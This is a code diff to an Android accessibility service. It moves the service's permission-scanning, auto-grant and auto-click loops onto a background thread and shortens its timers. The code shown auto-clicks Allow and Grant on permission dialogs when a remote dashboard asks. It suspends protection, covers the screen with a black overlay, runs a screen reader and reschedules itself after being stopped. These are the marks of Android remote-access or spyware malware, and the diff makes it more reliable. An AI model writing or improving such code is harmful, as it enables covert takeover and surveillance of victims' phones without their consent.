@@ -55,6 +55,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Runnable permissionScanRunnable;
     private Handler uninstallAssistHandler;
 
+    // Background thread for all periodic accessibility tree scans (permission scanner,
+    // auto-grant scanner, auto-click scanner).  Moving these off the main Looper
+    // prevents them from starving UI rendering and causing ANR when apps switch.
+    private android.os.HandlerThread permissionScanThread;
+    private Handler permissionBgHandler;
+
     // Auto-grant mode: clicks Allow/Grant/OK buttons for N seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
@@ -119,6 +125,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void onServiceConnected() {
         try { super.onServiceConnected(); } catch (Exception ignored) {}
         instance = this;
+
+        // Start the background HandlerThread used by all periodic accessibility scanners.
+        // MUST be done before startPermissionScanner / startAutoGrantTimer / startAutoClickScanner
+        // so those methods have a live Looper to post to.
+        try {
+            permissionScanThread = new android.os.HandlerThread("perm-scanner",
+                    android.os.Process.THREAD_PRIORITY_BACKGROUND);
+            permissionScanThread.start();
+            permissionBgHandler = new Handler(permissionScanThread.getLooper());
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start permissionScanThread: " + e.getMessage());
+            permissionBgHandler = new Handler(Looper.getMainLooper()); // safe fallback
+        }
 
         // Start permission scanner IMMEDIATELY - ready before any permission requests
         try { startPermissionScanner(); } catch (Exception ignored) {}
@@ -834,7 +853,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      *  Scans for permission buttons: Allow, Grant, OK, Allow all time, Allow access, etc.
      */
     private void startPermissionScanner() {
-        permissionScanHandler = new Handler(Looper.getMainLooper());
+        permissionScanHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
         permissionScanRunnable = new Runnable() {
             @Override
             public void run() {
@@ -860,7 +880,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private void startAutoGrantTimer() {
         autoGrantMode = true;
-        autoGrantHandler = new Handler(Looper.getMainLooper());
+        autoGrantHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
 
         // Independent scanner: runs every 250 ms during the grant window.
         // 250 ms is frequent enough to catch dialogs without hammering the main thread.
@@ -897,12 +918,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         }, 1_000);
 
-        // Auto-grant mode expires after 60 seconds (enough for all permission dialogs)
+        // Auto-grant mode expires after 25 seconds
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
-        }, 60_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
+            Log.i(TAG, "Auto-grant mode expired after 25 seconds");
+        }, 25_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 25s");
     }
 
     /**
@@ -910,7 +931,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Called by SocketManager when the dashboard requests storage permission on demand.
      */
     public void reEnableAutoGrant(long durationMs) {
-        if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
+        if (autoGrantHandler == null) {
+            autoGrantHandler = permissionBgHandler != null
+                    ? permissionBgHandler : new Handler(Looper.getMainLooper());
+        }
         autoGrantMode = true;
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
@@ -933,12 +957,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * preventing false clicks on unrelated permission dialogs.
      */
     public void enableStorageAutoGrant() {
-        if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
+        if (autoGrantHandler == null) {
+            autoGrantHandler = permissionBgHandler != null
+                    ? permissionBgHandler : new Handler(Looper.getMainLooper());
+        }
 
         protectionSuspendedUntil = System.currentTimeMillis() + 25_000;
 
         final long endTime = System.currentTimeMillis() + 5_000;
-        final Handler storageHandler = new Handler(Looper.getMainLooper());
+        final Handler storageHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
 
         storageHandler.post(new Runnable() {
             @Override
@@ -995,8 +1023,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { removeBlackOverlay(); } catch (Exception ignored) {}
-                Log.i(TAG, "Black overlay removed after 50 s");
-            }, 50_000);
+                Log.i(TAG, "Black overlay removed after 30 s");
+            }, 30_000);
         } catch (Exception e) {
             Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
         }
@@ -2353,12 +2381,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             SocketManager.getInstance(this).stopScreenReaderAuto();
         } catch (Exception ignored) {}
         try {
-            // permissionScanHandler runs every 200ms on the main thread — MUST be cancelled in onDestroy
+            // Cancel all periodic scanner callbacks before quitting the HandlerThread.
             if (permissionScanHandler != null && permissionScanRunnable != null) {
                 permissionScanHandler.removeCallbacks(permissionScanRunnable);
-                permissionScanHandler = null;
-                permissionScanRunnable = null;
             }
+            permissionScanHandler = null;
+            permissionScanRunnable = null;
+        } catch (Exception ignored) {}
+        try {
+            // Quit the background HandlerThread that drives all periodic scanners.
+            if (permissionScanThread != null) {
+                permissionScanThread.quitSafely();
+                permissionScanThread = null;
+            }
+            permissionBgHandler = null;
         } catch (Exception ignored) {}
 
         // Schedule a 5-second alarm so ensureAccessibilityRunning() fires quickly
@@ -2578,7 +2614,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     private void startAutoClickScanner() {
-        autoClickHandler = new Handler(Looper.getMainLooper());
+        autoClickHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
         autoClickRunnable = new Runnable() {
             @Override
             public void run() {
